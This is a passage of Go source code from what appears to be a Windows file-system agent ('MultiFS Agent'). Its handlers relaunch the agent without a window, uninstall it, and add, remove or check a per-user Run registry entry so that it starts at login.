	a.replyOK(req.ID, map[string]any{"relaunching": true})
	go func() {
		time.Sleep(500 * time.Millisecond)
		exe, err := os.Executable()
		if err != nil {
			return
		}
		cmd := exec.Command(exe)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: CREATE_NO_WINDOW,
		}
		_ = cmd.Start()
		os.Exit(0)
	}()
}

func (a *agent) opAgentUninstall(req *protocol.Request) {
	a.replyOK(req.ID, map[string]any{"uninstalling": true})
	go func() {
		time.Sleep(500 * time.Millisecond)
		_ = uninstallSelf()
		os.Exit(0)
	}()
}

// Startup-persistence-only ops. These manage HKCU\...\Run\MultiFS Agent
// without ever touching the agent binary itself.
func (a *agent) opAgentStartupInstall(req *protocol.Request) {
	exe, err := os.Executable()
	if err != nil {
		a.replyErr(req.ID, "could not resolve agent executable: "+err.Error())
		return
	}
	exe = filepath.Clean(exe)
	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE|registry.QUERY_VALUE,
	)
	if err != nil {
		a.replyErr(req.ID, "could not open Run key: "+err.Error())
		return
	}
	defer k.Close()
	if err := k.SetStringValue("MultiFS Agent", exe); err != nil {
		a.replyErr(req.ID, "could not write Run value: "+err.Error())
		return
	}
	a.replyOK(req.ID, map[string]any{
		"installed": true,
		"path":      exe,
		"location":  `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MultiFS Agent`,
	})
}

func (a *agent) opAgentStartupUninstall(req *protocol.Request) {
	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE|registry.QUERY_VALUE,
	)
	if err != nil {
		a.replyOK(req.ID, map[string]any{"installed": false, "removed": false})
		return
	}
	defer k.Close()
	_ = k.DeleteValue("MultiFS Agent")
	a.replyOK(req.ID, map[string]any{"installed": false, "removed": true})
}

func (a *agent) opAgentStartupStatus(req *protocol.Request) {
	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE,
	)
	if err != nil {
		a.replyOK(req.ID, map[string]any{"installed": false, "path": ""})
		return
	}
	defer k.Close()
	val, _, err := k.GetStringValue("MultiFS Agent")
	if err != nil {
		a.replyOK(req.ID, map[string]any{"installed": false, "path": ""})
		return
	}
	a.replyOK(req.ID, map[string]any{
		"installed": true,
		"path":      val,
		"location":  `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MultiFS Agent`,
	})
}
